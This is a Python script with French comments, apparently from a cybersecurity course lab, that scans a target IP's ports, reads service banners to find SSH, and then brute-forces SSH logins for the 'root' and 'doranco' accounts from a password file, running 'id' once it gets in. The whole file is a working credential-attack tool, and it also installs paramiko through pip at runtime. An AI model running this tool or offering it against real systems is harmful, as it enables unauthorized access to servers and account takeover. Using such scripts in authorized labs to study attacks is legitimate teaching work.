#!/usr/bin/env python3
import sys
import socket
import threading
import time
import subprocess
import os

# Configuration fixe
DICTIONARY_PATH = r"C:\Users\stagiaire\Documents\cours cyber\github\Cybersec\TP-01\passwords.txt"
THREAD_LIMIT = 50
SSH_TIMEOUT = 5
SCAN_TIMEOUT = 1
USERS_TO_TEST = ["root", "doranco"]  # Comptes à tester


def install_dependencies():
    """Installe paramiko automatiquement si absent"""
    try:
        import paramiko
    except ImportError:
        print("[!] Installation du module 'paramiko'...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko"])
            print("[+] Installation réussie")
        except Exception as e:
            print(f"[ERREUR] Impossible d'installer paramiko: {e}")
            sys.exit(1)


install_dependencies()
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException


def scan_port(host, port, open_ports):
    """Scan un port et détecte les services"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(SCAN_TIMEOUT)
            if s.connect_ex((host, port)) == 0:
                banner = get_service_banner(host, port)
                print(f"[+] Port {port}/tcp ouvert - {banner}")
                open_ports.append(port)
    except Exception as e:
        print(f"[-] Erreur sur le port {port}: {str(e)[:50]}")


def get_service_banner(host, port):
    """Récupère le banner du service"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(SCAN_TIMEOUT)
            s.connect((host, port))
            return s.recv(1024).decode(errors='ignore').strip() or "Service inconnu"
    except:
        return "Service inconnu"


def load_passwords():
    """Charge les mots de passe depuis le fichier fixe"""
    try:
        with open(DICTIONARY_PATH, 'r') as f:
            return [pwd.strip() for pwd in f if pwd.strip()]
    except FileNotFoundError:
        print(f"[ERREUR] Fichier introuvable: {DICTIONARY_PATH}")
        sys.exit(1)


def ssh_bruteforce(host, port, users, passwords):
    """Effectue le brute force SSH pour plusieurs utilisateurs"""
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())

    for user in users:
        print(f"\n[ATTACK] Attaque sur {user}@{host}:{port}")

        for password in passwords:
            try:
                print(f"[>] Test: {user}:{password[:20]}{'...' if len(password) > 20 else ''}", end='\r')

                ssh.connect(host, port=port, username=user,
                            password=password, timeout=SSH_TIMEOUT)

                print(f"\n[SUCCÈS] Connexion réussie: {user}:{password}")
                print("-" * 50)
                print(f"Commande SSH: ssh {user}@{host} -p {port}")

                # Exemple de commande
                stdin, stdout, stderr = ssh.exec_command('id')
                print(f"Résultat: {stdout.read().decode().strip()}")
                print("-" * 50)

                ssh.close()
                return True

            except AuthenticationException:
                continue
            except (SSHException, socket.error) as e:
                print(f"\n[!] Erreur: {str(e)[:100]}")
                time.sleep(3)
                break
            except Exception as e:
                print(f"\n[!] Erreur inattendue: {str(e)[:100]}")
                continue

    print("\n[!] Aucune combinaison valide trouvée")
    return False


def main():
    print(f"""
    ###########################################
    #  Scanner SSH + Bruteforce               #
    #  Cibles: {', '.join(USERS_TO_TEST)}           
    #  Dictionnaire: {DICTIONARY_PATH}        
    ###########################################
    """)

    # Chargement des mots de passe
    passwords = load_passwords()
    if not passwords:
        print("[ERREUR] Aucun mot de passe dans le fichier")
        sys.exit(1)

    # Configuration
    target = input("Adresse IP cible: ").strip()
    start_port = int(input("Port de début [1]: ") or 1)
    end_port = int(input("Port de fin [1024]: ") or 1024)

    # Phase 1: Scan de ports
    print(f"\n[PHASE 1] Scan des ports {start_port}-{end_port}...")
    open_ports = []

    for port in range(start_port, end_port + 1):
        while threading.active_count() > THREAD_LIMIT:
            time.sleep(0.1)
        threading.Thread(target=scan_port, args=(target, port, open_ports)).start()

    while threading.active_count() > 1:
        time.sleep(1)

    if not open_ports:
        print("[-] Aucun port ouvert trouvé")
        sys.exit(0)

    # Phase 2: Détection SSH
    print("\n[PHASE 2] Recherche des services SSH...")
    ssh_ports = []

    for port in open_ports:
        if 'ssh' in get_service_banner(target, port).lower():
            print(f"[+] SSH détecté sur le port {port}")
            ssh_ports.append(port)

    if not ssh_ports:
        print("[-] Aucun service SSH trouvé")
        sys.exit(0)

    # Phase 3: Bruteforce
    print("\n[PHASE 3] Lancement des attaques...")
    for port in ssh_ports:
        if ssh_bruteforce(target, port, USERS_TO_TEST, passwords):
            break


if __name__ == "__main__":
    main()